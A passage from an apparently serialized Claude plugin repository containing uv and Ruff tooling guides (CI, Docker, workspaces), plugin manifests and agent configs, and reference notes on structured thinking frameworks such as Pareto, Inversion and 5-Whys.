Ephemeral execution (like npx)\nuvx ruff check .\nuvx black .\n\n# Global install\nuv tool install ruff\nuv tool upgrade ruff\nuv tool list\nuv tool uninstall ruff\n```\n\n## The pip Interface\n\nDrop-in replacement for pip commands:\n\n```bash\nuv pip install requests\nuv pip install -r requirements.txt\nuv pip install -e .\nuv pip uninstall requests\nuv pip freeze > requirements.txt\nuv pip compile requirements.in -o requirements.txt\nuv pip sync requirements.txt\n```\n\n### Virtual Environment\n\n```bash\nuv venv                      # Create .venv\nuv venv --python 3.12        # Specific Python\nuv venv .venv-custom         # Custom name\nsource .venv/bin/activate    # Activate (optional with uv run)\n```\n\n## Scripts with Inline Dependencies\n\n```python\n# script.py\n# /// script\n# requires-python = \">=3.11\"\n# dependencies = [\"requests\", \"pandas\"]\n# ///\n\nimport requests\nimport pandas as pd\n# ...\n```\n\n```bash\nuv add --script script.py requests pandas  # Add deps to script\nuv run script.py                           # Auto-installs deps\n```\n\n## Building and Publishing\n\n```bash\nuv build                     # Build wheel + sdist\nuv build --wheel             # Wheel only\nuv publish                   # Publish to PyPI\nuv publish --publish-url https://test.pypi.org/legacy/  # TestPyPI\n```\n\n## Configuration\n\n### pyproject.toml\n\n```toml\n[tool.uv]\npython = \">=3.11\"\nindex-url = \"https://pypi.org/simple\"\nextra-index-url = [\"https://example.com/simple\"]\nresolution = \"highest\"  # or \"lowest\", \"lowest-direct\"\n\n[tool.uv.sources]\nmy-package = { git = \"https://github.com/user/repo.git\" }\nlocal-package = { path = \"../local-package\" }\n```\n\n### Environment Variables\n\n```bash\nUV_PYTHON_INSTALL_DIR=\"$HOME/.python\"\nUV_CACHE_DIR=\"$HOME/.cache/uv\"\nUV_NO_CACHE=1\nUV_INDEX_URL=\"https://pypi.org/simple\"\nUV_OFFLINE=1\n```\n\n## Caching\n\n```bash\nuv cache dir                 # Show location\nuv cache clean               # Clear all\nuv cache clean requests      # Clear specific\nuv cache prune               # Remove old entries\n```\n\n**Locations:**\n- macOS/Linux: `~/.cache/uv`\n- Windows: `%LOCALAPPDATA%\\uv\\cache`\n\n## Workspaces (Monorepo)\n\n**Root pyproject.toml:**\n```toml\n[tool.uv.workspace]\nmembers = [\"packages/*\", \"apps/*\"]\n```\n\n**Package referencing workspace:**\n```toml\n[project]\ndependencies = [\"myproject-core\"]\n\n[tool.uv.sources]\nmyproject-core = { workspace = true }\n```\n\n```bash\nuv sync                              # All packages\nuv run --package myproject-api pytest  # Specific package\n```\n\n## Comparison\n\n| Feature | uv | pip | poetry | conda |\n|---------|-----|-----|--------|-------|\n| Speed | 10-100x | 1x | 2-5x | 0.5x |\n| Lockfiles |  |  |  |  |\n| Python Management |  |  |  |  |\n| Tool Running |  |  |  |  |\n| Memory | Low | Med | Med | High |\n",
        "plugins/sys-builder/skills/managing-python/references/workflows.md": "# Advanced Workflows: UV and Ruff\n\n## Monorepo Management\n\n### Workspace Structure\n\n```\nmonorepo/\n pyproject.toml          # Workspace root\n uv.lock                 # Shared lockfile\n packages/\n    core/\n       pyproject.toml\n    api/\n        pyproject.toml\n apps/\n     web/\n         pyproject.toml\n```\n\n### Root Configuration\n\n```toml\n[tool.uv.workspace]\nmembers = [\"packages/*\", \"apps/*\"]\n\n[tool.uv]\ndev-dependencies = [\"pytest>=7.0.0\", \"ruff>=0.1.0\"]\n\n[tool.ruff]\nline-length = 88\ntarget-version = \"py311\"\n\n[tool.ruff.lint]\nselect = [\"E\", \"W\", \"F\", \"I\", \"B\"]\n```\n\n### Package Dependencies\n\n```toml\n# packages/api/pyproject.toml\n[project]\nname = \"myproject-api\"\ndependencies = [\"fastapi>=0.100.0\", \"myproject-core\"]\n\n[tool.uv.sources]\nmyproject-core = { workspace = true }\n```\n\n### Workspace Commands\n\n```bash\nuv sync                                   # All packages\nuv run --package myproject-api pytest     # Specific package\nuv add --package myproject-api requests   # Add to package\n```\n\n## Docker Integration\n\n### Multi-Stage Build\n\n```dockerfile\nFROM python:3.12-slim AS builder\nCOPY --from=ghcr.io/astral-sh/uv:latest /uv /usr/local/bin/uv\nWORKDIR /app\nCOPY pyproject.toml uv.lock ./\nRUN uv sync --frozen --no-dev --no-cache\n\nFROM python:3.12-slim\nWORKDIR /app\nCOPY --from=builder /app/.venv /app/.venv\nCOPY . .\nENV PATH=\"/app/.venv/bin:$PATH\"\nCMD [\"python\", \"-m\", \"myapp\"]\n```\n\n### Development Container\n\n```dockerfile\nFROM python:3.12-slim\nCOPY --from=ghcr.io/astral-sh/uv:latest /uv /usr/local/bin/uv\nWORKDIR /app\nCOPY pyproject.toml uv.lock ./\nRUN uv sync --frozen --no-cache\nCOPY . .\nCMD [\"uv\", \"run\", \"uvicorn\", \"main:app\", \"--reload\", \"--host\", \"0.0.0.0\"]\n```\n\n### Docker Compose\n\n```yaml\nservices:\n  app:\n    build: .\n    volumes:\n      - .:/app\n      - uv-cache:/root/.cache/uv\n    ports:\n      - \"8000:8000\"\n    command: uv run uvicorn main:app --reload --host 0.0.0.0\n\nvolumes:\n  uv-cache:\n```\n\n### Production Optimizations\n\n```dockerfile\n# Enable bytecode compilation\nENV UV_COMPILE_BYTECODE=1\n\n# Cache mount for faster builds\nRUN --mount=type=cache,target=/root/.cache/uv \\\n    uv sync --frozen --no-dev\n```\n\n## CI/CD Pipelines\n\n### GitHub Actions\n\n```yaml\nname: CI\non: [push, pull_request]\n\njobs:\n  quality:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Install uv\n        run: curl -LsSf https://astral.sh/uv/install.sh | sh\n\n      - name: Install dependencies\n        run: uv sync --frozen\n\n      - name: Lint\n        run: |\n          uv run ruff check .\n          uv run ruff format --check .\n\n      - name: Test\n        run: uv run pytest --cov=src\n\n  test-matrix:\n    runs-on: ${{ matrix.os }}\n    strategy:\n      matrix:\n        os: [ubuntu-latest, macos-latest, windows-latest]\n        python: ['3.11', '3.12']\n    steps:\n      - uses: actions/checkout@v4\n      - run: curl -LsSf https://astral.sh/uv/install.sh | sh\n      - run: uv python install ${{ matrix.python }}\n      - run: uv sync --frozen\n      - run: uv run pytest\n```\n\n### GitLab CI\n\n```yaml\nvariables:\n  UV_CACHE_DIR: ${CI_PROJECT_DIR}/.cache/uv\n\ncache:\n  paths:\n    - .cache/uv\n    - .venv\n\nbefore_script:\n  - curl -LsSf https://astral.sh/uv/install.sh | sh\n  - export PATH=\"$HOME/.local/bin:$PATH\"\n  - uv sync --frozen\n\nlint:\n  script:\n    - uv run ruff check .\n    - uv run ruff format --check .\n\ntest:\n  script: uv run pytest\n```\n\n### Pre-commit Integration\n\n```yaml\n# .pre-commit-config.yaml\nrepos:\n  - repo: https://github.com/astral-sh/ruff-pre-commit\n    rev: v0.12.8\n    hooks:\n      - id: ruff\n        args: [--fix, --exit-non-zero-on-fix]\n      - id: ruff-format\n\n  - repo: https://github.com/pre-commit/mirrors-mypy\n    rev: v1.8.0\n    hooks:\n      - id: mypy\n        additional_dependencies: [types-all]\n```\n\n```bash\nuv add --dev pre-commit\nuv run pre-commit install\n```\n\n## Development Workflow\n\n### VS Code Settings\n\n```json\n{\n  \"[python]\": {\n    \"editor.formatOnSave\": true,\n    \"editor.codeActionsOnSave\": {\n      \"source.fixAll.ruff\": \"explicit\",\n      \"source.organizeImports.ruff\": \"explicit\"\n    },\n    \"editor.defaultFormatter\": \"charliermarsh.ruff\"\n  }\n}\n```\n\n### Task Runner (justfile)\n\n```justfile\ninstall:\n    uv sync\n\ndev:\n    uv run uvicorn main:app --reload\n\nlint:\n    uv run ruff check --fix .\n    uv run ruff format .\n\ntest:\n    uv run pytest -v\n\ntest-cov:\n    uv run pytest --cov=src --cov-report=html\n\nupdate:\n    uv lock --upgrade\n    uv sync\n\nclean:\n    uv cache clean\n    ruff clean\n    find . -type d -name __pycache__ -exec rm -rf {} +\n\ncheck: lint test\n```\n\n## Production Deployments\n\n### AWS Lambda\n\n```dockerfile\nFROM public.ecr.aws/lambda/python:3.12\nCOPY --from=ghcr.io/astral-sh/uv:latest /uv /usr/local/bin/uv\nCOPY pyproject.toml uv.lock ./\nCOPY src ${LAMBDA_TASK_ROOT}/src\nRUN uv sync --frozen --no-dev --no-cache\nCMD [\"src.handler.lambda_handler\"]\n```\n\n### Google Cloud Run\n\n```dockerfile\nFROM python:3.12-slim\nCOPY --from=ghcr.io/astral-sh/uv:latest /uv /usr/local/bin/uv\nWORKDIR /app\nCOPY pyproject.toml uv.lock ./\nRUN uv sync --frozen --no-dev --no-cache\nCOPY . .\nENV PORT=8080\nCMD exec uv run uvicorn main:app --host 0.0.0.0 --port ${PORT}\n```\n\n### Kubernetes\n\n```yaml\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myapp\nspec:\n  replicas: 3\n  template:\n    spec:\n      containers:\n      - name: myapp\n        image: myapp:latest\n        resources:\n          requests:\n            memory: \"128Mi\"\n            cpu: \"100m\"\n          limits:\n            memory: \"256Mi\"\n            cpu: \"200m\"\n        livenessProbe:\n          httpGet:\n            path: /health\n            port: 8000\n```\n\n## Performance Tips\n\n### Caching in CI\n\n```yaml\n- name: Cache UV\n  uses: actions/cache@v3\n  with:\n    path: ~/.cache/uv\n    key: ${{ runner.os }}-uv-${{ hashFiles('uv.lock') }}\n```\n\n### Build Optimization\n\n```bash\nUV_COMPILE_BYTECODE=1      # Compile .pyc\nUV_SYSTEM_PYTHON=1         # Use system Python\nUV_NO_CACHE=1              # Skip cache (CI)\n```\n\n### Offline Mode\n\n```bash\nuv sync --offline          # Use only cached packages\n```\n\n## Team Collaboration\n\n### Contributing Guide\n\n```markdown\n## Setup\n\n1. Install UV: `curl -LsSf https://astral.sh/uv/install.sh | sh`\n2. Clone and install: `git clone ... && cd repo && uv sync`\n3. Run tests: `uv run pytest`\n\n## Before Committing\n\n- `uv run ruff check --fix .`\n- `uv run ruff format .`\n- `uv run pytest`\n\n## Adding Dependencies\n\n```bash\nuv add package-name        # Production\nuv add --dev package-name  # Development\n```\n```\n\n### Code Review Checklist\n\n- [ ] `uv run ruff check --fix .`\n- [ ] `uv run ruff format .`\n- [ ] `uv run pytest`\n- [ ] Updated `uv.lock` if deps changed\n- [ ] CI passes\n",
        "plugins/sys-cognition/.claude-plugin/plugin.json": "{\n    \"name\": \"sys-cognition\",\n    \"description\": \"AI/ML & COGNITIVE DOMAIN - Context engineering, memory systems, reasoning, prompt engineering, and agent orchestration\",\n    \"version\": \"1.0.3\",\n    \"license\": \"MIT\",\n    \"author\": {\n        \"name\": \"Git-Fg\"\n    },\n    \"keywords\": [\n        \"ai-ml\",\n        \"cognitive\",\n        \"context-engineering\",\n        \"memory-systems\",\n        \"reasoning\",\n        \"prompt-engineering\",\n        \"agent-orchestration\",\n        \"thinking-frameworks\"\n    ]\n}\n",
        "plugins/sys-cognition/README.md": "# sys-cognition\n\n**Brain Layer** - Thinking frameworks, prompt engineering, and context management for the Cat Toolkit.\n\n## Purpose\n\nProvides the cognitive infrastructure: structured reasoning frameworks, prompt optimization, session consolidation, and persistent context management.\n\n## Agents\n\n- **strategist** - Detached reasoning engine for deep analysis (read-only)\n- **prompt-engineer** - Prompt design with Complexity-Based Guidance Framework\n- **scribe** - Background context processor for session state and handoffs\n\n## Skills\n\n- **thinking-frameworks** - 12 structured frameworks (Strategic, Prioritization, Problem Analysis)\n- **deep-analysis** - Applies comprehensive frameworks to complex problems\n- **prompt-engineering** - Draft, optimize, and audit prompts with full library\n- **context-engineering** - Persistent session state management and handoffs\n- **summarize-session** - Session consolidation and health metrics\n- **prepare-handoff** - Structured context transfer between sessions\n\n## Usage\n\nStrategist operates in `plan` mode for safe analysis. Prompt-engineer uses XML/Markdown decision rules. Scribe runs in background for context persistence. All frameworks are passive knowledge until invoked.\n\n## Core Frameworks\n\n- **Strategic** - Long-term planning and positioning\n- **Prioritization** - Impact vs urgency matrices\n- **Problem Analysis** - Root cause and solution mapping\n- **Complexity-Based Guidance** - Dynamic prompt depth based on task complexity\n",
        "plugins/sys-cognition/agents/reasoner.md": "---\nname: reasoner\ndescription: \"Deep analysis runtime. Read-only forensic investigation.\"\ntools: [Read, Glob, Grep, Bash(ls:*), Bash(cat:*), Bash(find:*), Bash(git status:*), Bash(git log:*)]\nskills: [applying-reasoning]\n\n---\n# Reasoner Configuration\nRead-only runtime for deep architectural analysis.\n```\n",
        "plugins/sys-cognition/commands/think.md": "---\ndescription: \"USE when clarifying goals, exploring constraints, or applying structured thinking frameworks (Pareto, Inversion, First-Principles) to complex problems.\"\nargument-hint: \"What is the problem or decision you are facing?\"\nallowed-tools: [Skill(facilitating-reasoning)]\ndisable-model-invocation: true\n---\n\nInvoke `Skill(facilitating-reasoning)` with user's problem: \"$ARGUMENTS\".\n",
        "plugins/sys-cognition/skills/applying-reasoning/SKILL.md": "---\nname: applying-reasoning\ndescription: \"Applies structured mental models to solve complex problems. Use when solving architectural decisions, root cause analysis, or strategic planning.\"\nallowed-tools: [Read, Write, Edit, Glob, Grep, Bash]\n---\n\n# Reasoning Engine Protocol\n\n\n\n## Library of Models\n(See `references/` for detailed definitions)\n\n| Model | Use Case |\n|:---|:---|\n| **First Principles** | Building from scratch; verifying assumptions. |\n| **Inversion** | Debugging; identifying failure modes. |\n| **Pareto (80/20)** | Prioritization; finding high-leverage tasks. |\n| **Second Order** | Architectural changes; predicting side effects. |\n| **5 Whys** | Root cause analysis. |\n\n## Standard Combinations\n- **The Hardening (First Principles + Inversion):** Use for critical security or reliability code.\n- **The Efficiency (Pareto + Via Negativa):** Use for refactoring and cleanup.\n- **The Diagnostic (5 Whys + Occam's Razor):** Use for debugging.\n\n## Research Protocol (Core Mandate)\n1. **Research**: Use `Grep` and `Bash` to find architectural patterns, performance bottlenecks, or technical debt.\n2. **Framework Application**: Apply the `thinking-frameworks` methodology to the evidence found.\n3. **Synthesis**: Create an `ANALYSIS.md` report using the template below.\n\n## Constraints\n- **Evidence-First**: Never make a claim without a file reference or shell output to support it.\n- **Truth-First**: Contradict the user if the codebase evidence suggests their proposed path is flawed.\n\n## Artifact Schema: `ANALYSIS.md`\nWhen a Deep Analysis is requested, produce this artifact:\n\n```markdown\n# Strategic Analysis: {Topic}\n\n## Executive Summary\n{Concise findings}\n\n## Framework Application\n### {Framework Name}\n**Insight:** {What did this model reveal?}\n\n## Synthesis & Recommendations\n1. {Actionable Item 1}\n2. {Actionable Item 2}\n```\n",
        "plugins/sys-cognition/skills/applying-reasoning/references/framework-applications.md": "# Framework Application Methodology\n\nThis document provides detailed application instructions for each thinking framework. Used by both Sovereign Direct (foreground) and Sovereign Delegated (delegation) patterns.\n\n## Strategic Thinking Frameworks\n\n### First-Principles\n**Purpose:** Challenge assumptions, rebuild understanding from fundamentals\n\n**Application Steps:**\n1. **Identify the problem** - What are you trying to solve?\n2. **Break down to fundamentals** - List the core components, facts, and assumptions\n3. **Challenge each assumption** - Is this necessarily true? What if we remove this assumption?\n4. **Build from base truths** - Using only what's definitely true, reconstruct the understanding\n5. **Generate novel solutions** - Based on the rebuilt foundation, what new approaches emerge?\n\n**Output Structure:**\n- Original Problem Statement\n- Fundamental Components (bulleted list)\n- Challenged Assumptions (cross out invalid ones)\n- Base Truths Established\n- Novel Solutions Generated\n- Recommended Action\n\n**Example Application:**\n```\nProblem: \"Our user engagement is declining\"\nBreak Down:\n- User engagement metrics\n- User behavior patterns\n- Product features\n- User demographics\n- Market conditions\nChallenge: \"Is declining engagement necessarily due to product issues?\"\nBuild: Engagement requires value delivery + ease of use + motivation\nSolution: Focus on value delivery measurement, not just usage metrics\n```\n\n### Inversion\n**Purpose:** Identify failure modes to avoid them\n\n**Application Steps:**\n1. **State your goal** - What do you want to achieve?\n2. **Invert the goal** - What would guarantee failure?\n3. **Identify failure points** - What actions would lead to guaranteed failure?\n4. **Avoid the opposite** - Do the opposite of failure actions\n5. **Build robust approach** - Based on what guarantees failure, build a failure-resistant solution\n\n**Output Structure:**\n- Original Goal\n- Inverted Goal (Failure Condition)\n- Failure Mode Analysis\n- Avoidance Strategy\n- Robust Solution\n- Implementation Plan\n\n### Second-Order Thinking\n**Purpose:** Understand cascading consequences and long-term impacts\n\n**Application Steps:**\n1. **Identify the decision** - What choice needs to be made?\n2. **First-order effects** - What are the immediate consequences?\n3. **Second-order effects** - What are the consequences of the consequences?\n4. **Third-order effects** - Continue the chain\n5. **Analyze the cascade** - How do these effects interact and compound?\n6. **Make informed decision** - Based on the full cascade\n\n**Output Structure:**\n- Decision Point\n- First-Order Effects (immediate)\n- Second-Order Effects (short-term consequences)\n- Third-Order Effects (long-term cascade)\n- Interaction Analysis\n- Recommended Decision\n- Risk Mitigation\n\n### SWOT Analysis\n**Purpose:** Analyze strengths, weaknesses, opportunities, threats for strategic positioning\n\n**Application Steps:**\n1. **Define the scope** - What entity/situation are you analyzing?\n2. **Identify Strengths** - Internal positive factors\n3. **Identify Weaknesses** - Internal limitations\n4. **Identify Opportunities** - External favorable factors\n5. **Identify Threats** - External risks\n6. **Generate strategies** - Match strengths with opportunities, address weaknesses and threats\n\n**Output Structure:**\n- Analysis Scope\n- Strengths (internal, positive)\n- Weaknesses (internal, negative)\n- Opportunities (external, positive)\n- Threats (external, negative)\n- Strategy Matrix:\n  - SO (Strengths + Opportunities)\n  - WO (Weaknesses + Opportunities)\n  - ST (Strengths + Threats)\n  - WT (Weaknesses + Threats)\n- Strategic Recommendations\n\n### 10-10-10 Framework\n**Purpose:** Evaluate decisions across three time horizons\n\n**Application Steps:**\n1. **Frame the decision** - What choice needs to be made?\n2. **10 minutes perspective** - How will you feel about this in 10 minutes?\n3. **10 months perspective** - How will this impact you in 10 months?\n4. **10 years perspective** - How will this affect your life in 10 years?\n5. **Synthesize** - Balance across all three horizons\n6. **Make decision** - Choose based on holistic time perspective\n\n**Output Structure:**\n- Decision Under Consideration\n- 10-10-10 analysis\n- Synthesis\n- Recommended Choice\n- 10-Minute View:\n  - Immediate feelings\n  - Quick impact\n  - Reversibility\n- 10-Month View:\n  - Short-term consequences\n  - Medium-term impact\n  - Course correction options\n- 10-Year View:\n  - Long-term consequences\n  - Life impact\n  - Legacy consideration\n- Synthesis\n- Decision Rationale\n\n## Prioritization Frameworks\n\n### Pareto Principle (80/20)\n**Purpose:** Identify vital few factors that drive majority of results\n\n**Application Steps:**\n1. **List all factors** - What are all the inputs, activities, or elements?\n2. **Identify impact** - For each factor, what's the impact/outcome it creates?\n3. **Rank by impact** - Order from highest to lowest impact\n4. **Calculate cumulative impact** - What's the cumulative percentage?\n5. **Find the vital 20%** - Which factors create ~80% of results?\n6. **Focus recommendations** - Prioritize the vital few\n\n**Output Structure:**\n- All Factors Listed\n- Impact Assessment (for each factor)\n- Ranked List (highest to lowest impact)\n- Cumulative Impact Calculation\n- Vital Few Identified (20% that create 80%)\n- Focus Strategy\n- Resource Allocation Recommendations\n\n### One-Thing Method\n**Purpose:** Find the single highest-leverage action\n\n**Application Steps:**\n1. **Define the goal** - What outcome do you want?\n2. **List potential actions** - What could you do?\n3. **Identify leverage points** - Which actions have disproportionate impact?\n4. **Find the One Thing** - What single action makes everything else easier or unnecessary?\n5. **Prioritize ruthlessly** - Focus on the One Thing\n6. **Implement** - Do the One Thing first\n\n**Common Pitfalls:**\n- Picking something comfortable rather than highest-impact\n- Confusing urgent with important\n- Selecting too broad an action (not specific enough)\n- Abandoning the One Thing when it gets difficult\n- Not asking the focusing question recursively (what's the one thing for THIS one thing?)\n\n**Output Structure:**\n- Goal Statement\n- Potential Actions (comprehensive list)\n- Leverage Analysis (impact vs effort for each)\n- The One Thing Identified\n- Why It's Highest Leverage\n- Implementation Plan\n- Supporting Actions (if needed)\n\n**Example Application:**\n```\nGoal: \"Increase monthly revenue by 50%\"\nPotential Actions:\n- Launch new product line\n- Increase marketing spend\n- Hire more salespeople\n- Improve conversion rate\n- Raise prices\n- Expand to new markets\nLeverage Analysis:\n- Marketing spend: 1.2x return (measured)\n- Conversion rate: Currently 2%, industry avg 4%\n- New product: 6-month lead time\nThe One Thing: \"Fix the checkout flow to improve conversion rate\"\nWhy: Doubles revenue with existing traffic, no acquisition cost, enables all other growth\nImplementation: 2-week sprint focused only on checkout UX\n```\n\n### Eisenhower Matrix\n**Purpose:** Categorize by urgency vs importance\n\n**Application Steps:**\n1. **List all tasks/items** - What needs attention?\n2. **Assess urgency** - How time-sensitive is each?\n3. **Assess importance** - How important is each to your goal?\n4. **Categorize** - Place each in the appropriate quadrant:\n   - Q1: Urgent + Important (Do First)\n   - Q2: Not Urgent + Important (Schedule)\n   - Q3: Urgent + Not Important (Delegate)\n   - Q4: Not Urgent + Not Important (Eliminate)\n5. **Act on each quadrant** - Specific actions for each category\n\n**Output Structure:**\n- All Items Listed\n- Urgency Assessment\n- Importance Assessment\n- Quadrant Categorization:\n  - Quadrant 1 (Urgent + Important): Do First\n  - Quadrant 2 (Not Urgent + Important): Schedule\n  - Quadrant 3 (Urgent + Not Important): Delegate\n  - Quadrant 4 (Not Urgent + Not Important): Eliminate\n- Action Plan for Each Quadrant\n- Time Allocation Recommendation\n\n## Problem Analysis Frameworks\n\n### 5-Whys\n**Purpose:** Drill to root cause by asking \"why\" repeatedly\n\n**Application Steps:**\n1. **State the problem** - What is happening?\n2. **Ask \"why\"** - Why is this happening?\n3. **Ask \"why\" again** - Why is that the cause?\n4. **Continue drilling** - Ask \"why\" 5 times or until you reach root cause\n5. **Verify root cause** - Does this explain all symptoms?\n6. **Recommend solutions** - Address the root cause\n\n**Output Structure:**\n- Problem Statement\n- Why 1: [First cause]\n- Why 2: [Cause of cause 1]\n- Why 3: [Cause of cause 2]\n- Why 4: [Cause of cause 3]\n- Why 5: [Root cause]\n- Root Cause Verification\n- Solutions Targeting Root Cause\n- Implementation Recommendations\n\n### Opportunity-Cost Analysis\n**Purpose:** Analyze trade-offs and what you give up\n\n**Application Steps:**\n1. **Define the decision** - What choice are you making?\n2. **List all options** - What are the alternatives?\n3. **Analyze each option** - What do you gain? What do you give up?\n4. **Calculate opportunity costs** - What is the value of the next best alternative?\n5. **Compare trade-offs** - What are the relative costs and benefits?\n6. **Make decision** - Choose based on analysis\n\n**Output Structure:**\n- Decision Under Consideration\n- All Options Identified\n- For Each Option:\n  - Benefits/Gains\n  - Costs (including opportunity cost)\n  - Trade-offs\n- Opportunity Cost Calculation\n- Comparative Analysis\n- Decision Recommendation\n- Rationale\n\n### Occam's Razor\n**Purpose:** Find simplest explanation that fits all facts\n\n**Application Steps:**\n1. **Gather all facts** - What do we know for certain?\n2. **List all possible explanations** - What could explain these facts?\n3. **Test each explanation** - Does this explain ALL the facts?\n4. **Count assumptions** - How many assumptions does each require?\n5. **Choose simplest** - The explanation with fewest assumptions is best\n6. **Verify** - Does the simplest explanation actually fit all facts?\n\n**Output Structure:**\n- Facts Established\n- Possible Explanations (list all)\n- For Each Explanation:\n  - Required Assumptions\n  - Facts Explained\n  - Facts Not Explained\n- Simplest Explanation Selected\n- Verification\n- Implications\n- Action Items\n\n### Via Negativa\n**Purpose:** Improve by removing rather than adding\n\n**Application Steps:**\n1. **Identify the problem** - What needs improvement?\n2. **List current state** - What exists now?\n3. **Identify what to remove** - What can be eliminated?\n4. **Prioritize removal** - What removal will have greatest positive impact?\n5. **Remove systematically** - Eliminate identified elements\n6. **Assess improvement** - Did removal solve or improve the problem?\n\n**Common Pitfalls:**\n- Defaulting to \"add more\" before considering \"remove what hurts\"\n- Removing too much too fast (no baseline to measure)\n- Confusing \"nice to have\" with \"essential\"\n- Not tracking what was removed (can't reverse if needed)\n- Stopping at obvious removals without digging deeper\n\n**Output Structure:**\n- Problem Statement\n- Current State Analysis\n- Candidates for Removal\n- Removal Impact Assessment\n- Prioritized Removal List\n- Implementation Plan\n- Improvement Assessment\n\n**Example Application:**\n```\nProblem: \"Team velocity is declining despite adding process\"\nCurrent State:\n- Daily standups (15 min)\n- Sprint planning (2 hrs)\n- Retrospectives (1 hr)\n- Code review meetings (3 hrs/week)\n- Architecture review board (1 hr/week)\n- Status reports (2 hrs/week)\nCandidates for Removal:\n- Architecture review board: delays decisions, rubber-stamps anyway\n- Status reports: duplicate of standup content\n- Code review meetings: could be async\nPrioritized Removal:\n1. Architecture board  async Slack channel\n2. Status reports  eliminated\n3. Code review meetings  async PR comments\nResult: 6 hrs/week recovered, velocity increased 20%\n```\n\n## Application Templates\n\n### For Strategic Frameworks (First-Principles, Inversion, Second-Order, SWOT, 10-10-10):\n```\n1. Framework Applied: [Name]\n2. Context: [Brief situation summary]\n3. Analysis:\n   [Framework-specific analysis following the steps]\n4. Key Insights:\n    [Insight 1]\n    [Insight 2]\n    [Insight 3]\n5. Recommendations:\n    [Action 1]\n    [Action 2]\n6. Supporting Evidence: [Facts from context]\n```\n\n### For Prioritization Frameworks (Pareto, One-Thing, Eisenhower):\n```\n1. Framework Applied: [Name]\n2. Context: [What needs prioritization]\n3. Analysis:\n   [Framework-specific categorization/ranking]\n4. Priority Actions:\n   1. [Highest priority]\n   2. [Medium priority]\n   3. [Lower priority]\n5. Resource Allocation: [How to distribute effort]\n6. Expected Impact: [What results to expect]\n```\n\n### For Problem Analysis (5-Whys, Opportunity-Cost, Occam's Razor, Via Negativa):\n```\n1. Framework Applied: [Name]\n2. Problem/Question: [What we're analyzing]\n3. Analysis Process:\n   [Framework-specific analysis]\n4. Root Cause/Solution: [Primary finding]\n5. Supporting Evidence: [Data/facts]\n6. Implementation: [How to act on this]\n```\n\n## Usage Guidelines\n\n**For Sovereign Direct Pattern (Foreground Execution):**\n- Use these methodologies to guide real-time analysis\n- Walk through steps interactively with user\n- Provide examples for each step\n- Allow user to provide input at each stage\n\n**For Sovereign Delegated Pattern (Background Delegation):**\n- Agent applies methodology autonomously\n- Use Markdown prompt to provide comprehensive context\n- Agent follows steps systematically\n- Deliver complete analysis following template structure\n\n---\n\n## Cross-Framework Synergies: Viral Research Prompts\n\nThese research prompts operationalize thinking frameworks into copy-paste templates for rapid analysis.\n\n### First-Principles Operationalization\n\n**Prompts that apply First-Principles:**\n- **Contradictions Finder** - Exposes logical inconsistencies by testing against fundamental truths\n- **Explain It Backwards** - Deconstructs conclusions to verify base assumptions\n- **Assumption Stress Test** - Tests the foundational assumptions underlying arguments\n- **Translate Across Domains** - Uses analogies to reveal core mechanisms\n\n**Synergy Pattern:** Use First-Principles to establish base truths, then apply these prompts to validate reasoning.\n\n### Inversion Operationalization\n\n**Prompts that apply Inversion:**\n- **Reviewer #2** - Identifies failure modes through harsh critique\n- **What Would Break This?** - Maps realistic failure scenarios\n- **Assumption Stress Test** - Tests fragility of argument foundations\n\n**Synergy Pattern:** Apply Inversion framework to identify failure modes, then use these prompts to stress-test robustness.\n\n### Second-Order Thinking Operationalization\n\n**Prompts that apply Second-Order Thinking:**\n- **Turn Into Paper** - Structures first-order observations into coherent arguments\n- **What Changed My Mind?** - Triggers belief updates based on new evidence\n\n**Synergy Pattern:** Use Second-Order Thinking to map cascading effects, then apply these prompts to structure findings.\n\n### Occam's Razor Operationalization\n\n**Prompts that apply Occam's Razor:**\n- **One-Page Mental Model** - Compresses complex topics to simplest memorable form\n\n**Synergy Pattern:** After analysis, apply this prompt to distill insights to their essence.\n\n### Via Negativa Operationalization\n\n**Prompts that apply Via Negativa:**\n- **Reviewer #2** - Removes flattery and surface-level critique\n- **Steal the Structure** - Isolates effective patterns from noise\n\n**Synergy Pattern:** Use Via Negativa to remove unnecessary elements, then apply these prompts to extract what's essential.\n\n### Combined Workflow Example\n\n**Research Analysis Combo:**\n1. Apply **First-Principles** framework to establish baseline\n2. Use **Contradictions Finder** to identify inconsistencies\n3. Apply **Inversion** to map failure modes\n4. Use **What Would Break This?** to stress-test\n5. Apply **Second-Order Thinking** to evaluate cascading effects\n6. Use **Turn Into Paper** to structure findings\n7. Apply **Occam's Razor** via **One-Page Mental Model** to compress insights\n\n**Key Insight:** The thinking frameworks provide the methodology; the research prompts provide the operational tools. Together, they transform AI from conversational partner to research instrument.\n",
        "plugins/sys-cognition/skills/applying-reasoning/references/prioritization.md": "# Prioritization Frameworks\n\nPrioritization frameworks for focusing resources on high-impact activities. Use when overwhelmed with tasks, need clarity on what to do first, or struggling with focus.\n\n# Frameworks Index\n\nThe prioritization skill includes these frameworks:\n\n- pareto: Apply 80/20 rule to identify vital few factors that drive majority of results. Use when overwhelmed or needing to cut through noise.\n\n- one-thing: Identify single highest-leverage action that makes everything else easier or unnecessary. Use for finding domino actions.\n\n- eisenhower-matrix: Categorize by urgency vs importance (Do First, Schedule, Delegate, Eliminate). Use for task triage and reducing overwhelm.\n\n# Routing Logic\n\nWhen to use each framework:\n\n- Use **pareto** when: Overwhelmed with many technical issues (e.g., bugs, performance bottlenecks, tech debt) and needing to identify the 20% that cause 80% of the problems. Applicable to prioritizing test cases, refactoring tasks, or security vulnerabilities. Also useful for feature prioritization and resource allocation.\n\n- Use **one-thing** when: A complex technical goal requires a 'domino' action, such as identifying the single most impactful refactoring, the crucial first step in a large migration, or the core component that unlocks multiple features. Also applicable to personal productivity and identifying leverage points.\n\n- Use **eisenhower-matrix** when: Categorizing a backlog of tasks (bugs, features, chores) by urgency and importance to decide what to 'Do First', 'Schedule', 'Delegate', or 'Eliminate'. Useful for sprint planning, issue triage, and managing incoming support requests.\n\nMultiple frameworks can be combined:\n\n- **pareto + one-thing**: Identifying the critical technical debt items and then pinpointing the single refactoring that provides the most leverage.\n- **eisenhower-matrix + pareto**: Categorize tasks into quadrants, then apply 80/20 within the \"Do First\" and \"Schedule\" quadrants to identify the highest-impact items.\n\n## Example Applications\n\n**Technical debt prioritization**: Which refactoring will give the biggest bang for buck? (Use pareto to identify the 20% of code issues causing 80% of problems, one-thing to find the domino refactoring).\n\n**Bug triage**: Drowning in bug reports? (Use eisenhower-matrix 